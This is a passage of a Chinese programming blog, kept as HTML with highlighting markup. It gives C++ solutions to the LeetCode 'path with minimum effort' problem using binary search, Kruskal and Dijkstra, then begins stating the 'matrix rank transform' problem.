class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：路径 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>] 的相邻格子差值绝对值最大为 <span class="number">1</span> ，比路径 [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>] 更优。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：上图所示路径不需要消耗任何体力。</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">+ rows == heights.length</span><br><span class="line">+ columns == heights[i].length</span><br><span class="line">+ <span class="number">1</span> &lt;= rows, columns &lt;= <span class="number">100</span></span><br><span class="line">+ <span class="number">1</span> &lt;= heights[i][j] &lt;= <span class="number">106</span></span><br><span class="line"></span><br><span class="line">### 地址</span><br><span class="line">https:<span class="comment">//leetcode-cn.com/problems/path-with-minimum-effort</span></span><br><span class="line">### 题意</span><br><span class="line">&gt;  二分查找</span><br><span class="line">### 思路</span><br><span class="line"><span class="number">1.</span> 这个题目可以有三种解法：</span><br><span class="line">+ 二分查找： 我们找到合适的值，如果能够满足`(<span class="number">0</span>,<span class="number">0</span>)`与`(row<span class="number">-1</span>,col<span class="number">-1</span>)`两个点连通则认为该值为目标值。算法时间复杂度为$O(row*col*\lgn$.</span><br><span class="line">+ `kruskal`算法：我们将所有相邻的节点之间的绝对值之差记作两个定点的长度，然后用最小生成树算法，按照边的大小开始选择边，直到`(<span class="number">0</span>,<span class="number">0</span>)`与`(row<span class="number">-1</span>,col<span class="number">-1</span>)`两个点连通$O(row*col*\lg(row*col)$.。</span><br><span class="line">+ `dijistra`算法： 我们按照`(<span class="number">0</span>,<span class="number">0</span>)`开始`bfs`,`dp[x][y]`代表从`(<span class="number">0</span>,<span class="number">0</span>)`到`(x,y)`的最小体力，最基本的`dijistra`算法即可搞定。 </span><br><span class="line"><span class="number">2.</span> 非常喜欢这类需要思考的题目，解法很多，但是每个解法都有思考的深度。</span><br><span class="line">### 代码</span><br><span class="line">+ 二分查找</span><br><span class="line">```c++</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="symbol">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">bool</span> check(vector&lt;vector&lt;<span class="built_in">int</span>&gt;&gt;&amp; heights, <span class="built_in">int</span> effort)&#123;</span><br><span class="line">        <span class="built_in">int</span> row = heights.size();</span><br><span class="line">        <span class="built_in">int</span> col = heights[<span class="number">0</span>].size();</span><br><span class="line">        <span class="built_in">int</span> d[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;&#125;;</span><br><span class="line">        vector&lt;vector&lt;<span class="built_in">bool</span>&gt;&gt; visit(row,vector&lt;<span class="built_in">bool</span>&gt;(col,<span class="literal">false</span>));</span><br><span class="line">        queue&lt;<span class="built_in">int</span>&gt; qu;</span><br><span class="line"></span><br><span class="line">        visit[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        qu.push(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(!qu.empty())&#123;</span><br><span class="line">            <span class="built_in">int</span> curr = qu.front();</span><br><span class="line">            qu.pop();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">int</span> x = curr/col;</span><br><span class="line">            <span class="built_in">int</span> y = curr%col;</span><br><span class="line">            <span class="keyword">if</span>(x == row<span class="number">-1</span> &amp;&amp; y == col<span class="number">-1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)&#123;</span><br><span class="line">                <span class="built_in">int</span> x1 = x + d[i][<span class="number">0</span>];</span><br><span class="line">                <span class="built_in">int</span> y1 = y + d[i][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(x1 &lt; <span class="number">0</span> || y1 &lt; <span class="number">0</span> || x1 &gt;= row || y1 &gt;= col) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(visit[x1][y1]) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(abs(heights[x][y]-heights[x1][y1]) &gt; effort) <span class="keyword">continue</span>;</span><br><span class="line">                visit[x1][y1] = <span class="literal">true</span>;</span><br><span class="line">                qu.push(x1*col+y1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> minimumEffortPath(vector&lt;vector&lt;<span class="built_in">int</span>&gt;&gt;&amp; heights) &#123;</span><br><span class="line">        <span class="built_in">int</span> row = heights.size();</span><br><span class="line">        <span class="built_in">int</span> col = heights[<span class="number">0</span>].size();</span><br><span class="line">        <span class="built_in">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="built_in">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">int</span> r = <span class="number">1e6</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(l &lt;= r)&#123;</span><br><span class="line">            <span class="built_in">int</span> mid = (l + r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(heights,mid))&#123;</span><br><span class="line">                ans = min(ans,mid);</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><ul><li><code>kruskal</code>算法：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> effort;</span><br><span class="line">    Edge(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> effort)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">        <span class="keyword">this</span>-&gt;effort = effort;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Edge &amp; a, Edge &amp; b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.effort &lt; b.effort;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; f,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x != f[x]) x = f[x];</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">uni</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; f,<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x1 = find(f,x);</span><br><span class="line">    <span class="keyword">int</span> y1 = find(f,y);</span><br><span class="line">    <span class="keyword">if</span>(x1 == y1) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    f[x1] = y1;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumEffortPath</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; heights)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = heights.size();</span><br><span class="line">        <span class="keyword">int</span> col = heights[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> d[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; f(row*col);</span><br><span class="line">        <span class="built_in">vector</span>&lt;Edge&gt; edges;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">                f[i*col+j] = i*col + j;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k)&#123;</span><br><span class="line">                    <span class="keyword">int</span> x = i + d[k][<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">int</span> y = j + d[k][<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span>(x &gt;= <span class="number">0</span> &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; x &lt; row &amp;&amp; y &lt; col)&#123;</span><br><span class="line">                        edges.push_back(Edge(i*col+j,x*col+y,<span class="built_in">abs</span>(heights[i][j]-heights[x][y])));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(edges.begin(),edges.end(),cmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; edges.size(); ++i)&#123;</span><br><span class="line">            uni(f,edges[i].x,edges[i].y);</span><br><span class="line">            <span class="keyword">if</span>(find(f,<span class="number">0</span>) == find(f,row*col<span class="number">-1</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> edges[i].effort;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><code>dijistra</code>算法：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> effort;</span><br><span class="line">    Node(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> effort)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">        <span class="keyword">this</span>-&gt;effort = effort;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(Node &amp; a, Node &amp; b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.effort &gt;= b.effort;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">101</span>][<span class="number">101</span>];</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumEffortPath</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; heights)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = heights.size();</span><br><span class="line">        <span class="keyword">int</span> col = heights[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> d[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0x3f3f3f3f</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        priority_queue&lt;Node,<span class="built_in">vector</span>&lt;Node&gt;,cmp&gt; pq;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        pq.push(Node(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">while</span>(!pq.empty())&#123;</span><br><span class="line">            Node curr = pq.top();</span><br><span class="line">            pq.pop();</span><br><span class="line">            <span class="keyword">if</span>(curr.x == row - <span class="number">1</span> &amp;&amp; curr.y == col - <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> curr.effort;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)&#123;</span><br><span class="line">                <span class="keyword">int</span> x = curr.x + d[i][<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">int</span> y = curr.y + d[i][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(x &gt;= <span class="number">0</span> &amp;&amp; x &lt; row &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; col)&#123;</span><br><span class="line">                    <span class="keyword">int</span> effort = max(curr.effort,<span class="built_in">abs</span>(heights[x][y]-heights[curr.x][curr.y]));</span><br><span class="line">                    <span class="keyword">if</span>(dp[x][y] &lt;=effort ) <span class="keyword">continue</span>;</span><br><span class="line">                    pq.push(Node(x,y,effort));</span><br><span class="line">                    dp[x][y] = effort;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> effort;</span><br><span class="line">    Node(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> effort)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">        <span class="keyword">this</span>-&gt;effort = effort;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(Node &amp; a, Node &amp; b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.effort &gt;= b.effort;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">101</span>][<span class="number">101</span>];</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumEffortPath</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; heights)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = heights.size();</span><br><span class="line">        <span class="keyword">int</span> col = heights[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> d[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0x3f3f3f3f</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">queue</span>&lt;Node&gt; pq;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        pq.push(Node(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">while</span>(!pq.empty())&#123;</span><br><span class="line">            Node curr = pq.front();</span><br><span class="line">            pq.pop();</span><br><span class="line">            <span class="keyword">if</span>(curr.x == row - <span class="number">1</span> &amp;&amp; curr.y == col - <span class="number">1</span>)&#123;</span><br><span class="line">                ans = min(ans,curr.effort);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)&#123;</span><br><span class="line">                <span class="keyword">int</span> x = curr.x + d[i][<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">int</span> y = curr.y + d[i][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(x &gt;= <span class="number">0</span> &amp;&amp; x &lt; row &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; col)&#123;</span><br><span class="line">                    <span class="keyword">int</span> effort = max(curr.effort,<span class="built_in">abs</span>(heights[x][y]-heights[curr.x][curr.y]));</span><br><span class="line">                    <span class="keyword">if</span>(dp[x][y] &lt;=effort ) <span class="keyword">continue</span>;</span><br><span class="line">                    pq.push(Node(x,y,effort));</span><br><span class="line">                    dp[x][y] = effort;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="5156-矩阵转换后的秩"><a href="#5156-矩阵转换后的秩" class="headerlink" title="5156. 矩阵转换后的秩"></a>5156. 矩阵转换后的秩</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个 <code>m x n</code>的矩阵 <code>matrix</code> ，请你返回一个新的矩阵 <code>answer</code> ，其中 <code>answer[row][col]</code> 是 <code>matrix[row][col]</code> 的秩。</p><p>每个元素的 秩 是一个整数，表示这个元素相对于其他元素的大小关系，它按照如下规则计算：</p><ul><li>如果一个元素是它所在行和列的最小值，那么它的 秩 为 1。</li><li>如果两个元素 p 和 q 在 同一行 或者 同一列 ，那么：</li><li>如果 p &lt; q ，那么 rank(p) &lt; rank(q)</li><li>如果 p == q ，那么 rank(p) == rank(q)</li><li>如果 p &gt; q ，那么 rank(p) &gt; rank(q)</li><li>秩 需要越 小 越好。<br>题目保证按照上面规则 answer 数组是唯一的。</li></ul><p>示例 1：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix = [[1,2],[3,4]]</span><br><span class="line">输出：[[1,2],[2,3]]</span><br><span class="line">解释：</span><br><span class="line">matrix[<span class="string">0</span>][<span class="symbol">0</span>] 的秩为 1 ，因为它是所在行和列的最小整数。</span><br><span class="line">matrix[<span class="string">0</span>][<span class="symbol">1</span>] 的秩为 2 ，因为 matrix[<span class="string">0</span>][<span class="symbol">1</span>] &gt; matrix[<span class="string">0</span>][<span class="symbol">0</span>] 且 matrix[<span class="string">0</span>][<span class="symbol">0</span>] 的秩为 1 。</span><br><span class="line">matrix[<span class="string">1</span>][<span class="symbol">0</span>] 的秩为 2 ，因为 matrix[<span class="string">1</span>][<span class="symbol">0</span>] &gt; matrix[<span class="string">0</span>][<span class="symbol">0</span>] 且 matrix[<span class="string">0</span>][<span class="symbol">0</span>] 的秩为 1 。</span><br><span class="line">matrix[<span class="string">1</span>][<span class="symbol">1</span>] 的秩为 3 ，因为 matrix[<span class="string">1</span>][<span class="symbol">1</span>] &gt; matrix[<span class="string">0</span>][<span class="symbol">1</span>]， matrix[<span class="string">1</span>][<span class="symbol">1</span>] &gt; matrix[<span class="string">1</span>][<span class="symbol">0</span>] 且 matrix[<span class="string">0</span>][<span class="symbol">1</span>] 和 matrix[<span class="string">1</span>][<span class="symbol">0</span>] 的秩都为 2 。</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix = <span class="string">[[7,7],[7,7]]</span></span><br><span class="line">输出：<span class="string">[[1,1],[1,1]]</span></span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix = [[<span class="number">20</span>,<span class="number">-21</span>,<span class="number">14</span>],[<span class="number">-19</span>,<span class="number">4</span>,<span class="number">19</span>],[<span class="number">22</span>,<span class="number">-47</span>,<span class="number">24</span>],[<span class="number">-19</span>,<span class="number">4</span>,<span class="number">19</span>]]</span><br><span class="line">输出：[[<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">1</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>]]</span><br></pre></td></tr></table></figure><p>示例 